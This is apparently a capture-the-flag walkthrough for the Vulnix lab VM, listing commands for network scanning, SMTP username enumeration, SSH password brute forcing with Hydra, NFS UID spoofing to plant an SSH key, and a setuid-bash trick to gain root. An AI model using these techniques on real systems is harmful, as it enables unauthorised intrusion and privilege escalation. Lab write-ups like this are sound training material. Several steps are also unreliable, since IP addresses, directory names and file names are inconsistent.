# Vulnix-walk-through

# 00 change network setting for the machine to bridged 

# 0. Get VM’s IP

nmap 192.168.1.0/24 

machine ip is 192.168.1.3


# enumeration

![image](https://user-images.githubusercontent.com/52453415/128644622-90d01174-fc9c-4188-a8b2-e886888bbfe9.png)

non of the services was vulnerable 

# smtp enumeration 

using the wordlist from seclist of top-usernames-shortlist.txt

smtp-user-enum -M VRFY -U /top-usernames-shortlist.txt -t 192.168.1.3 

found that user, root are exist

using finger 

![image](https://user-images.githubusercontent.com/52453415/128644728-4cf90139-0b61-4927-81b7-4ca231a396f4.png)

# NFS enumeration

there is mounted files on the system

![image](https://user-images.githubusercontent.com/52453415/128644802-0fb94c76-9f18-441d-a060-10bc7e12edee.png)

mount them ! 

![image](https://user-images.githubusercontent.com/52453415/128644814-28cc9234-8940-4c4d-8c62-0bd128a42ff5.png)

but permission is denied ; searched why i've learned that the root_squash flag  is set for these files 

![image](https://user-images.githubusercontent.com/52453415/128644921-f4e863e1-67b7-4956-8e13-6de51393df1c.png)

probably that what we are going to do :D 

any way 

since that there are no vulnerable service lets take the brute force approach

# brute force ssh with user "user"

i don't think that brute forcing user " root " would be helpful so i tried "user" with hydra witch got me the password letmein

# Privilege escalation 

sudo -l ; nothing 

gcc ; not installed 

cd /home/vulnix ; not permitted 

we need to access this mounted files and edit it 

If you navigate to `/home you’ll notice the shared directory we couldn’t access earlier. Why don’t we try to get the UID for vulnix and create a temporary user on our system and access it?

id vulnix

uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)

in another terminal 

useradd -u 2008 vulnix

mkdir /home/kali/temp

mount -t nfs 192.168.1.72:/home/vulnix /home/kali/tmp

sudo su vulnix 

cd /home/kali/temp

![image](https://user-images.githubusercontent.com/52453415/128645095-14ed7670-a138-4402-8e65-b6b92f83130d.png)

now let's edit these files to access with vulnix user which we hope that it has more prvi

let's generate ssh keys and transfer it to the mounted dir and get in 

Create ssh key pair by running ssh-keygen.

Create .ssh directory on the mounted share /home/kali/temp/.ssh

mkdir  /home/kali/temp/.ssh

cat /home/kali/id_rsa.pub >> /home/kali/temp/authorized_keys.txt

now let's login ssh vulnix@192.168.1.3

whoami >> vulnix 

first thing to check sudo -l 

shows that i can edit /etc/exporters

which is the access control list for filesystems which may be exported

now i will mount the / directory with no_root_squash fllag 

i added this line to the file 

/root  *(rw, no_root_squash)

or i could just edit /home/vulnix to be 

/home/vulnix  *(rw, no_root_squash)


now we are good to go ; except that these exchanges will not take place unless the machine is rebooted but i have no privilege to do this via the command line 

so in the real world you won't be able to do this you will until it reboots ; i rebooted the VM 

now copy the bin/bash with our root privilege and setuid for it to the mounted dir 

cp /bin/bash /home/kali/temp

chmod 4777 /home/kali/temp/bin/bash

![image](https://user-images.githubusercontent.com/52453415/128645477-46e95acf-64fd-4c7e-a362-ad0b50142922.png)

ssh vulnix@192.16.1.3 

bash -p // to keep the file privilege 

whoami 

root 




